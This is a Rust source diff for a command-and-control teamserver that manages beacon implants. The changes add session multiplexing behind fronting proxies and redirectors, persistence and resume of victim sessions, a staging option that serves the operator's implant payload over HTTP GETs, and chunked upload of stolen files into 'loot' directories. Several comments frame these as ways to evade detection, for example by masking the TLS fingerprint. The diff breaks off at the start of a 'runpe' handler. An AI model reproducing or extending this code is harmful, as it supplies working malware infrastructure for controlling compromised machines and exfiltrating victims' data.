@@ -1,19 +1,20 @@
 use abraham_common::crypto::{self, ClientHello, Session};
-use abraham_common::frame::open_frames;
-use abraham_common::http::{read_request, write_response};
+use abraham_common::frame::{open_frames, ProtocolError};
+use abraham_common::http::{read_request, write_response, HttpRequest, HDR_HANDSHAKE, HDR_SESSION};
 use abraham_common::message::{
     self, driver_action, msg, Chunk, Message, RegisterInfo, Task, TaskBody, TaskResult,
 };
 use abraham_common::profile::{Profile, DEFAULT_PROFILE_PATH};
 use ed25519_dalek::SigningKey;
 use rand_core::OsRng;
+use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 use sha2::{Digest, Sha256};
 use std::collections::HashMap;
 use std::net::SocketAddr;
 use std::path::{Path, PathBuf};
-use std::sync::atomic::{AtomicU32, Ordering};
-use std::sync::Arc;
+use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
+use std::sync::{Arc, Mutex as SyncMutex};
 use std::time::{SystemTime, UNIX_EPOCH};
 use tokio::io::{AsyncBufReadExt, AsyncRead, AsyncWrite, AsyncWriteExt, BufReader};
 use tokio::net::{TcpListener, TcpStream};
@@ -27,9 +28,17 @@ const KEY_DEFAULT: &str = "server.key";
 const PROFILE_DEFAULT: &str = DEFAULT_PROFILE_PATH;
 const CERT_DEFAULT: &str = "server-cert.pem";
 const TLSKEY_DEFAULT: &str = "server-tls-key.pem";
+const STATE_DEFAULT: &str = "state/sessions.json";
 const CHUNK_SIZE: usize = 60_000;
 const MAX_BODY: usize = 8 * 1024 * 1024;
+/// Provisional handshakes awaiting their REGISTER, kept so the register
+/// can arrive on ANY origin connection (fronting proxies pool them).
+const PROVISIONAL_CAP: usize = 128;
+const PROVISIONAL_TTL_SECS: u64 = 300;
+/// Results kept per session in the persistence file (latest win).
+const PERSIST_RESULT_CAP: usize = 200;
 
+#[derive(Debug, Clone, Serialize, Deserialize)]
 struct StoredResult {
     task_id: u32,
     kind: String,
@@ -38,19 +47,63 @@ struct StoredResult {
     timestamp: u64,
 }
 
-struct SessionHandle {
-    info: RegisterInfo,
-    addr: String,
-    last_seen: u64,
+/// One logical beacon session. Everything a request needs lives here —
+/// crypto state, task queue, result history — so ANY origin connection
+/// can serve ANY session: a fronting proxy (Cloudflare origin pooling)
+/// interleaves requests from several beacon transports on one
+/// server-side connection, and the X-Session header routes each request
+/// to its session regardless of which TCP stream delivered it.
+struct LiveSession {
+    id: u32,
+    /// Crypto state from the LATEST handshake on this session's
+    /// transport. `None` while the session has no live transport (loaded
+    /// from the persistence file and not yet resumed).
+    crypto: SyncMutex<Option<Session>>,
+    info: SyncMutex<RegisterInfo>,
+    addr: SyncMutex<String>,
+    last_seen: AtomicU64,
     queue: mpsc::UnboundedSender<Message>,
+    queue_rx: SyncMutex<mpsc::UnboundedReceiver<Message>>,
     results: Arc<RwLock<Vec<StoredResult>>>,
+    /// Reassembly buffer for implant→server chunked payloads (loot).
+    pending_uploads: SyncMutex<HashMap<u32, Vec<u8>>>,
+}
+
+impl LiveSession {
+    /// Seals one response frame under the current transport keys. Each
+    /// frame re-locks: a REGISTER racing on another connection can swap
+    /// the keys mid-response, and the loser transport then fails to open
+    /// the mix — it is reconnecting anyway, and the winner is unaffected.
+    fn seal(&self, msg_type: u8, plaintext: &[u8]) -> Result<Vec<u8>, ProtocolError> {
+        self.crypto
+            .lock()
+            .unwrap()
+            .as_mut()
+            .ok_or(ProtocolError::Crypto)?
+            .seal(msg_type, plaintext)
+    }
+
+    fn set_seen(&self) {
+        self.last_seen.store(now(), Ordering::SeqCst);
+    }
 }
 
 struct AppState {
-    sessions: RwLock<HashMap<u32, SessionHandle>>,
+    sessions: RwLock<HashMap<u32, Arc<LiveSession>>>,
+    /// session_token -> session_id for RESUME: a re-register with a
+    /// known token reattaches the transport to the SAME session (id,
+    /// queued tasks, results) when a fronting proxy dropped the old
+    /// connection.
+    tokens: RwLock<HashMap<u64, u32>>,
+    /// Handshakes awaiting their REGISTER, keyed by session token: the
+    /// register may land on a different pooled origin connection than
+    /// the hello that produced the keys.
+    provisionals: SyncMutex<HashMap<u64, (Session, u64)>>,
     next_session_id: AtomicU32,
     next_task_id: AtomicU32,
     signing_key: SigningKey,
+    /// Persistence file; `None` disables saving.
+    state_path: Option<PathBuf>,
 }
 
 fn now() -> u64 {
@@ -96,7 +149,7 @@ fn load_tls_pair(
             .ok_or_else(|| anyhow::anyhow!("no private key in {}", key_path.display()))?;
         Ok((certs, key))
     } else {
-        let generated = rcgen::generate_simple_self_signed(vec!["abraham".to_string()])?;
+        let generated = rcgen::generate_simple_self_signed(vec!["web".to_string()])?;
         std::fs::write(cert_path, generated.cert.pem())?;
         std::fs::write(key_path, generated.key_pair.serialize_pem())?;
         let certs = vec![generated.cert.der().clone()];
@@ -113,6 +166,18 @@ async fn main() -> anyhow::Result<()> {
     let profile_path = PathBuf::from(arg_or("--profile", PROFILE_DEFAULT));
     let cert_path = PathBuf::from(arg_or("--tls-cert", CERT_DEFAULT));
     let tlskey_path = PathBuf::from(arg_or("--tls-key", TLSKEY_DEFAULT));
+    // Optional payload staging: GETs on the profile URIs serve these
+    // bytes (the operator's implant/stager) with no protocol framing —
+    // the classic staged-download over the same malleable front.
+    let stage_file = arg_or("--stage-file", "");
+    let stage: Option<Arc<Vec<u8>>> = if stage_file.is_empty() {
+        None
+    } else {
+        let bytes =
+            std::fs::read(&stage_file).unwrap_or_else(|e| panic!("--stage-file {stage_file}: {e}"));
+        println!("[*] staging {} bytes on GETs", bytes.len());
+        Some(Arc::new(bytes))
+    };
 
     let profile = if profile_path.exists() {
         Profile::load_file(&profile_path).map_err(anyhow::Error::msg)?
@@ -140,6 +205,17 @@ async fn main() -> anyhow::Result<()> {
         pub_path.display()
     );
 
+    // Session persistence: a redeploy restarts the teamserver; sessions
+    // (ids, tokens, results, queued tasks) survive on disk and beacons
+    // RESUME into them on their next re-register instead of orphaning
+    // the history. Empty value disables.
+    let state_arg = arg_or("--state", STATE_DEFAULT);
+    let state_path = if state_arg.is_empty() {
+        None
+    } else {
+        Some(PathBuf::from(&state_arg))
+    };
+
     let (certs, key) = load_tls_pair(&cert_path, &tlskey_path)?;
     let pin = Sha256::digest(certs[0].as_ref());
     println!("[*] tls cert sha256: {}", hex::encode(pin));
@@ -150,13 +226,33 @@ async fn main() -> anyhow::Result<()> {
 
     let state = Arc::new(AppState {
         sessions: RwLock::new(HashMap::new()),
+        tokens: RwLock::new(HashMap::new()),
+        provisionals: SyncMutex::new(HashMap::new()),
         next_session_id: AtomicU32::new(1),
         next_task_id: AtomicU32::new(1),
         signing_key,
+        state_path,
     });
+    if let Some(path) = &state.state_path {
+        match load_state(&state, path).await {
+            Ok(n) => println!("[*] state: {n} session(s) restored from {}", path.display()),
+            Err(e) => eprintln!("[!] state load failed ({e}); starting fresh"),
+        }
+    }
 
     let c2 = TcpListener::bind(&c2_addr).await?;
-    println!("[*] c2 (https) listening on {c2_addr}");
+    // Plain-C2 mode terminates TLS at a fronting redirector (see
+    // deploy/redirector) and proxies plain HTTP here; end-to-end
+    // authenticity is the inner Ed25519 session either way, and the
+    // outer TLS fingerprint becomes the redirector's instead of
+    // rustls's — which a User-Agent claiming Chrome would otherwise
+    // contradict.
+    let plain_c2 = std::env::args().any(|a| a == "--plain-c2");
+    if plain_c2 {
+        println!("[*] c2 (plain, behind redirector) listening on {c2_addr}");
+    } else {
+        println!("[*] c2 (https) listening on {c2_addr}");
+    }
     let mgmt = TcpListener::bind(&mgmt_addr).await?;
     println!("[*] mgmt listening on {mgmt_addr}");
 
@@ -167,8 +263,18 @@ async fn main() -> anyhow::Result<()> {
         loop {
             if let Ok((stream, peer)) = c2.accept().await {
                 let state = c2_state.clone();
-                let acceptor = c2_acceptor.clone();
                 let profile = c2_profile.clone();
+                if plain_c2 {
+                    let stage = stage.clone();
+                    tokio::spawn(async move {
+                        if let Err(e) = run_session(stream, peer, state, profile, stage).await {
+                            eprintln!("[!] session {peer} ended: {e}");
+                        }
+                    });
+                    continue;
+                }
+                let acceptor = c2_acceptor.clone();
+                let stage = stage.clone();
                 tokio::spawn(async move {
                     let tls_stream = match acceptor.accept(stream).await {
                         Ok(s) => s,
@@ -177,7 +283,7 @@ async fn main() -> anyhow::Result<()> {
                             return;
                         }
                     };
-                    if let Err(e) = run_session(tls_stream, peer, state, profile).await {
+                    if let Err(e) = run_session(tls_stream, peer, state, profile, stage).await {
                         eprintln!("[!] session {peer} ended: {e}");
                     }
                 });
@@ -208,226 +314,316 @@ fn request_allowed(method: &str, uri: &str, profile: &Profile) -> bool {
     method == "POST" && profile.uris.iter().any(|allowed| allowed == uri)
 }
 
+fn session_token_of(req: &HttpRequest) -> Option<u64> {
+    std::str::from_utf8(req.header(HDR_SESSION)?)
+        .ok()?
+        .trim()
+        .parse()
+        .ok()
+}
+
+fn is_handshake(req: &HttpRequest) -> bool {
+    // X-Handshake marks demux-aware ClientHello POSTs; the bare
+    // body-length check keeps legacy (headerless) implants working.
+    matches!(req.header(HDR_HANDSHAKE), Some(v) if v == b"1")
+        || (req.body.len() == crypto::CLIENT_HELLO_LEN && session_token_of(req).is_none())
+}
+
+/// One origin connection. Connection-bound state is a LEGACY fallback
+/// only (headerless implants); every request from a demux-aware implant
+/// carries X-Session and routes through the shared registry, so proxy
+/// origin pooling that interleaves foreign requests into this stream
+/// cannot break the sessions riding it — a bad frame costs the offending
+/// request (400), never the connection.
 async fn run_session<S: AsyncRead + AsyncWrite + Unpin>(
     mut stream: S,
     peer: SocketAddr,
     state: Arc<AppState>,
     profile: Profile,
+    stage: Option<Arc<Vec<u8>>>,
 ) -> Result<(), anyhow::Error> {
-    let Some(mut session) = handshake(&mut stream, &state, &profile).await? else {
-        return Ok(());
-    };
-    let Some((session_id, rx, results)) =
-        await_register(&mut stream, &mut session, peer, &state, &profile).await?
-    else {
-        return Ok(());
-    };
-    let mut established = Established {
-        session,
-        session_id,
-        rx,
-        results,
-        pending_downloads: HashMap::new(),
-    };
-    let result = established_loop(&mut stream, &mut established, &state, &profile).await;
-    state.sessions.write().await.remove(&session_id);
-    println!("[-] session {} removed", established.session_id);
-    result
-}
-
-struct Established {
-    session: Session,
-    session_id: u32,
-    rx: mpsc::UnboundedReceiver<Message>,
-    results: Arc<RwLock<Vec<StoredResult>>>,
-    pending_downloads: HashMap<u32, Vec<u8>>,
-}
-
-/// First request on a connection carries the raw 64-byte ClientHello; the
-/// response body carries the raw 128-byte ServerHello.
-async fn handshake<S: AsyncRead + AsyncWrite + Unpin>(
-    stream: &mut S,
-    state: &Arc<AppState>,
-    profile: &Profile,
-) -> Result<Option<Session>, anyhow::Error> {
+    // Legacy: handshake awaiting its REGISTER on THIS connection.
+    let mut conn_hello: Option<Session> = None;
+    // Legacy: session bound to THIS connection.
+    let mut conn_session: Option<Arc<LiveSession>> = None;
     loop {
-        let Some(req) = read_request(stream).await? else {
-            return Ok(None);
+        let Some(req) = read_request(&mut stream).await? else {
+            return Ok(());
         };
-        if !request_allowed(&req.method, &req.uri, profile) {
+        if req.method == "GET" {
+            if let Some(bytes) = &stage {
+                write_response(&mut stream, 200, &profile.server_header, bytes).await?;
+                continue;
+            }
+        }
+        if !request_allowed(&req.method, &req.uri, &profile) {
             let status = reject_status(&req.method);
-            write_response(stream, status, &profile.server_header, b"").await?;
+            write_response(&mut stream, status, &profile.server_header, b"").await?;
             continue;
         }
-        if req.body.len() != crypto::CLIENT_HELLO_LEN {
-            write_response(stream, 400, &profile.server_header, b"").await?;
-            anyhow::bail!(
-                "handshake: expected {} bytes, got {}",
-                crypto::CLIENT_HELLO_LEN,
-                req.body.len()
-            );
+        if req.body.len() > MAX_BODY {
+            write_response(&mut stream, 413, &profile.server_header, b"").await?;
+            anyhow::bail!("request body {} exceeds limit", req.body.len());
         }
-        let raw: [u8; crypto::CLIENT_HELLO_LEN] = req.body.as_slice().try_into()?;
-        let client_hello = ClientHello::from_bytes(&raw);
-        let (secret, server_hello) = crypto::server_respond(&state.signing_key, &client_hello);
-        write_response(
-            stream,
-            200,
-            &profile.server_header,
-            &server_hello.to_bytes(),
-        )
-        .await?;
-        return Ok(Some(crypto::server_finish(
-            secret,
-            &client_hello,
-            &server_hello,
-        )));
+        if is_handshake(&req) {
+            if req.body.len() != crypto::CLIENT_HELLO_LEN {
+                write_response(&mut stream, 400, &profile.server_header, b"").await?;
+                anyhow::bail!(
+                    "handshake: expected {} bytes, got {}",
+                    crypto::CLIENT_HELLO_LEN,
+                    req.body.len()
+                );
+            }
+            let raw: [u8; crypto::CLIENT_HELLO_LEN] = req.body.as_slice().try_into()?;
+            let client_hello = ClientHello::from_bytes(&raw);
+            let (secret, server_hello) = crypto::server_respond(&state.signing_key, &client_hello);
+            write_response(
+                &mut stream,
+                200,
+                &profile.server_header,
+                &server_hello.to_bytes(),
+            )
+            .await?;
+            let session = crypto::server_finish(secret, &client_hello, &server_hello);
+            match session_token_of(&req) {
+                // Demux-aware implant: park the keys under its token so
+                // the REGISTER finds them on any pooled connection.
+                Some(token) => {
+                    let mut provisionals = state.provisionals.lock().unwrap();
+                    if provisionals.len() >= PROVISIONAL_CAP {
+                        let cutoff = now().saturating_sub(PROVISIONAL_TTL_SECS);
+                        provisionals.retain(|_, (_, ts)| *ts > cutoff);
+                    }
+                    provisionals.insert(token, (session, now()));
+                }
+                None => conn_hello = Some(session),
+            }
+            continue;
+        }
+        // Frame request: route by token when tagged, else fall back to
+        // the connection-bound legacy path. A provisional handshake for
+        // the token wins over the live session: it exists exactly between
+        // the beacon's hello and its REGISTER, and that REGISTER is sealed
+        // with the fresh keys, not the session's current ones.
+        if let Some(token) = session_token_of(&req) {
+            let provisional = state.provisionals.lock().unwrap().remove(&token);
+            if let Some((session, _)) = provisional {
+                conn_session = register(&mut stream, &req.body, session, peer, &state, &profile)
+                    .await?
+                    .or(conn_session);
+                continue;
+            }
+            let live = {
+                let tokens = state.tokens.read().await;
+                match tokens.get(&token).copied() {
+                    Some(id) => state.sessions.read().await.get(&id).cloned(),
+                    None => None,
+                }
+            };
+            if let Some(live) = live {
+                serve_session(&mut stream, &req, &live, &state, &profile).await?;
+                continue;
+            }
+            write_response(&mut stream, 400, &profile.server_header, b"").await?;
+            continue;
+        }
+        if let Some(session) = conn_hello.take() {
+            conn_session = register(&mut stream, &req.body, session, peer, &state, &profile)
+                .await?
+                .or(conn_session);
+            continue;
+        }
+        if let Some(live) = conn_session.clone() {
+            serve_session(&mut stream, &req, &live, &state, &profile).await?;
+            continue;
+        }
+        write_response(&mut stream, 400, &profile.server_header, b"").await?;
     }
 }
 
-async fn await_register<S: AsyncRead + AsyncWrite + Unpin>(
+/// Processes a REGISTER frame sealed under a fresh handshake: a known
+/// session token RESUMES the live session (id, queued tasks, results)
+/// with this handshake's keys, an unknown one opens a new session.
+/// Responds 400 and keeps the connection when the frame does not decrypt
+/// (pooled stray). Returns the live session for the legacy conn path.
+async fn register<S: AsyncWrite + Unpin>(
     stream: &mut S,
-    session: &mut Session,
+    body: &[u8],
+    mut session: Session,
     peer: SocketAddr,
     state: &Arc<AppState>,
     profile: &Profile,
-) -> Result<
-    Option<(
-        u32,
-        mpsc::UnboundedReceiver<Message>,
-        Arc<RwLock<Vec<StoredResult>>>,
-    )>,
-    anyhow::Error,
-> {
-    loop {
-        let Some(req) = read_request(stream).await? else {
-            return Ok(None);
-        };
-        if !request_allowed(&req.method, &req.uri, profile) {
-            let status = reject_status(&req.method);
-            write_response(stream, status, &profile.server_header, b"").await?;
-            continue;
-        }
-        let frames = match open_frames(&req.body, session) {
-            Ok(frames) => frames,
-            Err(e) => {
-                write_response(stream, 400, &profile.server_header, b"").await?;
-                anyhow::bail!("register: bad frames: {e}");
-            }
-        };
-        if frames.len() != 1 || frames[0].0 != msg::REGISTER {
+) -> Result<Option<Arc<LiveSession>>, anyhow::Error> {
+    let frames = match open_frames(body, &mut session) {
+        Ok(frames) => frames,
+        Err(e) => {
             write_response(stream, 400, &profile.server_header, b"").await?;
-            anyhow::bail!("register: expected a single REGISTER frame");
+            eprintln!("[!] register from {peer}: bad frames: {e}");
+            return Ok(None);
         }
-        let Message::Register(info) = Message::decode(msg::REGISTER, &frames[0].1)? else {
-            anyhow::bail!("register: undecodable REGISTER frame");
-        };
+    };
+    if frames.len() != 1 || frames[0].0 != msg::REGISTER {
+        write_response(stream, 400, &profile.server_header, b"").await?;
+        anyhow::bail!("register: expected a single REGISTER frame");
+    }
+    let Message::Register(info) = Message::decode(msg::REGISTER, &frames[0].1)? else {
+        anyhow::bail!("register: undecodable REGISTER frame");
+    };
+    let tokens = state.tokens.read().await;
+    let candidate = tokens.get(&info.session_token).copied();
+    drop(tokens);
+    let resumed = match candidate {
+        Some(id) => state.sessions.read().await.get(&id).cloned(),
+        None => None,
+    };
+    let live = if let Some(live) = resumed {
+        *live.crypto.lock().unwrap() = Some(session);
+        *live.info.lock().unwrap() = info.clone();
+        *live.addr.lock().unwrap() = peer.to_string();
+        live.set_seen();
+        println!("[~] session {} resumed from {peer}", live.id);
+        live
+    } else {
         let session_id = state.next_session_id.fetch_add(1, Ordering::SeqCst);
         let (tx, rx) = mpsc::unbounded_channel::<Message>();
-        let results = Arc::new(RwLock::new(Vec::<StoredResult>::new()));
-        state.sessions.write().await.insert(
-            session_id,
-            SessionHandle {
-                info: info.clone(),
-                addr: peer.to_string(),
-                last_seen: now(),
-                queue: tx,
-                results: results.clone(),
-            },
-        );
+        let live = Arc::new(LiveSession {
+            id: session_id,
+            crypto: SyncMutex::new(Some(session)),
+            info: SyncMutex::new(info.clone()),
+            addr: SyncMutex::new(peer.to_string()),
+            last_seen: AtomicU64::new(now()),
+            queue: tx,
+            queue_rx: SyncMutex::new(rx),
+            results: Arc::new(RwLock::new(Vec::<StoredResult>::new())),
+            pending_uploads: SyncMutex::new(HashMap::new()),
+        });
+        state
+            .sessions
+            .write()
+            .await
+            .insert(session_id, live.clone());
+        if info.session_token != 0 {
+            state
+                .tokens
+                .write()
+                .await
+                .insert(info.session_token, session_id);
+        }
         println!(
             "[+] session {session_id}: {}\\{}@{} from {} (implant {})",
             info.domain, info.username, info.hostname, peer, info.implant_version
         );
-        write_response(stream, 200, &profile.server_header, b"").await?;
-        return Ok(Some((session_id, rx, results)));
-    }
+        live
+    };
+    write_response(stream, 200, &profile.server_header, b"").await?;
+    persist_state(state).await;
+    Ok(Some(live))
 }
 
-async fn established_loop<S: AsyncRead + AsyncWrite + Unpin>(
+/// Serves one request of an established session (poll/result/chunk/ping).
+/// A decrypt failure costs this request (400), never the connection —
+/// other sessions may still be riding the same pooled stream.
+async fn serve_session<S: AsyncWrite + Unpin>(
     stream: &mut S,
-    established: &mut Established,
+    req: &HttpRequest,
+    live: &Arc<LiveSession>,
     state: &Arc<AppState>,
     profile: &Profile,
 ) -> Result<(), anyhow::Error> {
-    let session_id = established.session_id;
-    loop {
-        let Some(req) = read_request(stream).await? else {
+    let frames = {
+        let mut guard = live.crypto.lock().unwrap();
+        match guard.as_mut() {
+            Some(session) => open_frames(&req.body, session),
+            None => Err(ProtocolError::Crypto),
+        }
+    };
+    let frames = match frames {
+        Ok(frames) => frames,
+        Err(e) => {
+            write_response(stream, 400, &profile.server_header, b"").await?;
+            eprintln!("[!] session {}: bad frames: {e}", live.id);
             return Ok(());
-        };
-        if !request_allowed(&req.method, &req.uri, profile) {
-            let status = reject_status(&req.method);
-            write_response(stream, status, &profile.server_header, b"").await?;
-            continue;
         }
-        if req.body.len() > MAX_BODY {
-            write_response(stream, 413, &profile.server_header, b"").await?;
-            anyhow::bail!("request body {} exceeds limit", req.body.len());
-        }
-        let session = &mut established.session;
-        let frames = match open_frames(&req.body, session) {
-            Ok(frames) => frames,
-            Err(e) => {
-                write_response(stream, 400, &profile.server_header, b"").await?;
-                anyhow::bail!("session {session_id}: bad frames: {e}");
+    };
+    let mut response: Vec<u8> = Vec::new();
+    let mut dirty = false;
+    for (msg_type, payload) in frames {
+        match msg_type {
+            msg::REGISTER => {
+                // Same keys decrypting a second REGISTER means a proxy
+                // duplicated the request; the first register already won.
+                eprintln!("[!] session {}: duplicate register ignored", live.id);
             }
-        };
-        let mut response: Vec<u8> = Vec::new();
-        for (msg_type, payload) in frames {
-            match msg_type {
-                msg::TASK_POLL => {
-                    if let Some(handle) = state.sessions.write().await.get_mut(&session_id) {
-                        handle.last_seen = now();
+            msg::TASK_POLL => {
+                live.set_seen();
+                let outbound: Vec<Message> = {
+                    let mut rx = live.queue_rx.lock().unwrap();
+                    let mut drained = Vec::new();
+                    while let Ok(message) = rx.try_recv() {
+                        drained.push(message);
                     }
-                    while let Ok(outbound) = established.rx.try_recv() {
-                        let (mt, body) = outbound.encode();
-                        response.extend_from_slice(&session.seal(mt, &body)?);
-                    }
-                    let (mt, body) = Message::BatchEnd.encode();
-                    response.extend_from_slice(&session.seal(mt, &body)?);
+                    drained
+                };
+                for message in outbound {
+                    let (mt, body) = message.encode();
+                    response.extend_from_slice(&live.seal(mt, &body)?);
                 }
-                msg::RESULT => {
-                    if let Message::TaskResult(result) = Message::decode(msg_type, &payload)? {
-                        store_task_result(&established.results, result).await;
-                    }
+                let (mt, body) = Message::BatchEnd.encode();
+                response.extend_from_slice(&live.seal(mt, &body)?);
+            }
+            msg::RESULT => {
+                if let Message::TaskResult(result) = Message::decode(msg_type, &payload)? {
+                    store_task_result(&live.results, result).await;
+                    dirty = true;
                 }
-                msg::CHUNK => {
-                    if let Message::Chunk(chunk) = Message::decode(msg_type, &payload)? {
-                        let ack = handle_download_chunk(
-                            established.session_id,
-                            &mut established.pending_downloads,
-                            chunk,
-                            &established.results,
-                        )
-                        .await?;
-                        if let Some((mt, body)) = ack {
-                            let frame = session.seal(mt, &body)?;
-                            response.extend_from_slice(&frame);
+            }
+            msg::CHUNK => {
+                if let Message::Chunk(chunk) = Message::decode(msg_type, &payload)? {
+                    // Buffer under the lock; the loot write (async fs) runs
+                    // outside it.
+                    let completed = {
+                        let mut pending = live.pending_uploads.lock().unwrap();
+                        let entry = pending.entry(chunk.task_id).or_default();
+                        entry.extend_from_slice(&chunk.data);
+                        if chunk.last {
+                            pending.remove(&chunk.task_id)
+                        } else {
+                            None
                         }
+                    };
+                    if let Some(data) = completed {
+                        let (mt, body) =
+                            write_loot(live.id, chunk.task_id, data, &live.results).await?;
+                        response.extend_from_slice(&live.seal(mt, &body)?);
+                        dirty = true;
                     }
                 }
-                msg::PING => {
-                    let (mt, body) = Message::Pong.encode();
-                    response.extend_from_slice(&session.seal(mt, &body)?);
-                }
-                msg::ERROR => {
-                    if let Message::Error { code, message } = Message::decode(msg_type, &payload)? {
-                        eprintln!("[!] implant reported error {code}: {message}");
-                    }
-                }
-                _ => {}
             }
+            msg::PING => {
+                let (mt, body) = Message::Pong.encode();
+                response.extend_from_slice(&live.seal(mt, &body)?);
+            }
+            msg::ERROR => {
+                if let Message::Error { code, message } = Message::decode(msg_type, &payload)? {
+                    eprintln!("[!] implant reported error {code}: {message}");
+                }
+            }
+            _ => {}
         }
-        write_response(stream, 200, &profile.server_header, &response).await?;
     }
+    write_response(stream, 200, &profile.server_header, &response).await?;
+    if dirty {
+        persist_state(state).await;
+    }
+    Ok(())
 }
 
 async fn store_task_result(results: &Arc<RwLock<Vec<StoredResult>>>, result: TaskResult) {
     let summary = match String::from_utf8(result.data.clone()) {
         Ok(text) => {
             let text = text.replace(['\r', '\n'], " ");
-            if text.len() > 200 {
-                format!("{}...", &text[..200])
+            if text.len() > 2000 {
+                format!("{}...", &text[..2000])
             } else {
                 text
             }
@@ -443,38 +639,188 @@ async fn store_task_result(results: &Arc<RwLock<Vec<StoredResult>>>, result: Tas
     });
 }
 
-/// Buffers a download chunk; once the last chunk lands the loot file is
-/// written and a TaskResult ack message is returned for the response body.
-async fn handle_download_chunk(
+/// Writes a completed chunked payload as loot and returns the ack frame
+/// body for the response.
+async fn write_loot(
     session_id: u32,
-    pending: &mut HashMap<u32, Vec<u8>>,
-    chunk: Chunk,
+    task_id: u32,
+    data: Vec<u8>,
     results: &Arc<RwLock<Vec<StoredResult>>>,
-) -> anyhow::Result<Option<(u8, Vec<u8>)>> {
-    let entry = pending.entry(chunk.task_id).or_default();
-    entry.extend_from_slice(&chunk.data);
-    if !chunk.last {
-        return Ok(None);
-    }
-    let data = pending.remove(&chunk.task_id).unwrap_or_default();
+) -> anyhow::Result<(u8, Vec<u8>)> {
     let dir = PathBuf::from(format!("loot/session-{session_id}"));
     tokio::fs::create_dir_all(&dir).await?;
-    let path = dir.join(format!("task-{}.bin", chunk.task_id));
+    let path = dir.join(format!("task-{task_id}.bin"));
     tokio::fs::write(&path, &data).await?;
     results.write().await.push(StoredResult {
-        task_id: chunk.task_id,
+        task_id,
         kind: "download".into(),
         status: message::STATUS_OK,
         summary: format!("{} ({} bytes)", path.display(), data.len()),
         timestamp: now(),
     });
     let ack = Message::TaskResult(TaskResult {
-        id: chunk.task_id,
+        id: task_id,
         status: message::STATUS_OK,
         data: path.to_string_lossy().as_bytes().to_vec(),
     });
     let (mt, body) = ack.encode();
-    Ok(Some((mt, body)))
+    Ok((mt, body))
+}
+
+#[derive(Serialize, Deserialize)]
+struct PersistedInfo {
+    token: u64,
+    hostname: String,
+    username: String,
+    domain: String,
+    pid: u32,
+    ppid: u32,
+    arch: u8,
+    integrity_level: u8,
+    os_build: String,
+    implant_version: String,
+}
+
+#[derive(Serialize, Deserialize)]
+struct PersistedSession {
+    id: u32,
+    info: PersistedInfo,
+    addr: String,
+    last_seen: u64,
+    results: Vec<StoredResult>,
+}
+
+#[derive(Serialize, Deserialize)]
+struct PersistedState {
+    next_session_id: u32,
+    next_task_id: u32,
+    sessions: Vec<PersistedSession>,
+}
+
+/// Snapshots the session registry (ids, tokens, identity, result
+/// history, counters) so a restart — a redeploy — keeps the sessions and
+/// beacons RESUME into them on the next re-register. Queued tasks ride
+/// in the in-memory channel: they deliver after a resume within one
+/// server lifetime; a restart loses whatever was still undelivered.
+/// Failures log and continue: persistence is an operational nicety, not
+/// a correctness gate.
+async fn persist_state(state: &Arc<AppState>) {
+    let Some(path) = state.state_path.clone() else {
+        return;
+    };
+    let mut sessions = Vec::new();
+    {
+        let registry = state.sessions.read().await;
+        for live in registry.values() {
+            // Guards close before the results await below (Send future).
+            let (info, addr) = {
+                let info = live.info.lock().unwrap();
+                (
+                    PersistedInfo {
+                        token: info.session_token,
+                        hostname: info.hostname.clone(),
+                        username: info.username.clone(),
+                        domain: info.domain.clone(),
+                        pid: info.pid,
+                        ppid: info.ppid,
+                        arch: info.arch,
+                        integrity_level: info.integrity_level,
+                        os_build: info.os_build.clone(),
+                        implant_version: info.implant_version.clone(),
+                    },
+                    live.addr.lock().unwrap().clone(),
+                )
+            };
+            let mut results = live.results.read().await.clone();
+            if results.len() > PERSIST_RESULT_CAP {
+                results.drain(..results.len() - PERSIST_RESULT_CAP);
+            }
+            sessions.push(PersistedSession {
+                id: live.id,
+                info,
+                addr,
+                last_seen: live.last_seen.load(Ordering::SeqCst),
+                results,
+            });
+        }
+    }
+    let snapshot = PersistedState {
+        next_session_id: state.next_session_id.load(Ordering::SeqCst),
+        next_task_id: state.next_task_id.load(Ordering::SeqCst),
+        sessions,
+    };
+    let data = match serde_json::to_vec(&snapshot) {
+        Ok(data) => data,
+        Err(e) => {
+            eprintln!("[!] state serialize: {e}");
+            return;
+        }
+    };
+    let tmp = path.with_extension("json.tmp");
+    if let Some(parent) = path.parent() {
+        let _ = tokio::fs::create_dir_all(parent).await;
+    }
+    if let Err(e) = tokio::fs::write(&tmp, &data).await {
+        eprintln!("[!] state write {}: {e}", tmp.display());
+        return;
+    }
+    if let Err(e) = tokio::fs::rename(&tmp, &path).await {
+        eprintln!("[!] state rename to {}: {e}", path.display());
+    }
+}
+
+/// Restores the registry from the persistence file. Restored sessions
+/// have no transport (crypto `None`) until their beacon re-registers.
+async fn load_state(state: &Arc<AppState>, path: &Path) -> anyhow::Result<usize> {
+    let bytes = tokio::fs::read(path).await?;
+    let parsed: PersistedState = serde_json::from_slice(&bytes)?;
+    let mut loaded = 0usize;
+    let mut max_id = 0u32;
+    let mut max_task = 0u32;
+    for persisted in parsed.sessions {
+        let (tx, rx) = mpsc::unbounded_channel::<Message>();
+        max_id = max_id.max(persisted.id);
+        for result in &persisted.results {
+            max_task = max_task.max(result.task_id);
+        }
+        let info = RegisterInfo {
+            session_token: persisted.info.token,
+            hostname: persisted.info.hostname,
+            username: persisted.info.username,
+            domain: persisted.info.domain,
+            pid: persisted.info.pid,
+            ppid: persisted.info.ppid,
+            arch: persisted.info.arch,
+            integrity_level: persisted.info.integrity_level,
+            os_build: persisted.info.os_build,
+            implant_version: persisted.info.implant_version,
+        };
+        let token = info.session_token;
+        let id = persisted.id;
+        let live = Arc::new(LiveSession {
+            id,
+            crypto: SyncMutex::new(None),
+            info: SyncMutex::new(info),
+            addr: SyncMutex::new(persisted.addr),
+            last_seen: AtomicU64::new(persisted.last_seen),
+            queue: tx,
+            queue_rx: SyncMutex::new(rx),
+            results: Arc::new(RwLock::new(persisted.results)),
+            pending_uploads: SyncMutex::new(HashMap::new()),
+        });
+        if token != 0 {
+            state.tokens.write().await.insert(token, id);
+        }
+        state.sessions.write().await.insert(id, live);
+        loaded += 1;
+    }
+    state
+        .next_session_id
+        .store(parsed.next_session_id.max(max_id + 1), Ordering::SeqCst);
+    state
+        .next_task_id
+        .store(parsed.next_task_id.max(max_task + 1), Ordering::SeqCst);
+    Ok(loaded)
 }
 
 async fn run_mgmt(stream: TcpStream, state: Arc<AppState>) -> anyhow::Result<()> {
@@ -591,6 +937,162 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
             )
             .await
         }
+        "runpe" => {
